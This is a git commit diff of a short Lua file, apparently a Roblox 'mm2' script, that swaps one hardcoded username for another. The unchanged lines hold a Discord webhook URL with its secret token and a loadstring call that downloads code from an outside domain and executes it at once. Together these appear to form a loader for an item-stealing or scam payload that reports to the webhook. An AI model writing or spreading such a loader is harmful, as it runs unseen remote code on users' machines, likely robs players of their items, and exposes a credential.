856821184deda7299597a27bf8baa2a6f0aa52a8
Xeven-Gaming <154922337+Xeven-Gaming@users.noreply.github.com>
2024-07-27 17:27:19 -0400

    Update 2.lua

--- 2.lua
+++ 2.lua
@@ -1,4 +1,4 @@
-Username = "iwantvcpls1000"
+Username = "xxzg32"
 Webhook = "https://discord.com/api/webhooks/1266565498393333771/rW_R2Q1lEj9s5mTQvq-lsWKuKNKqHxEIwGzZke_eB-VGz6FDz1P1JNnWPxvd7SrdH6sn"
 
 loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
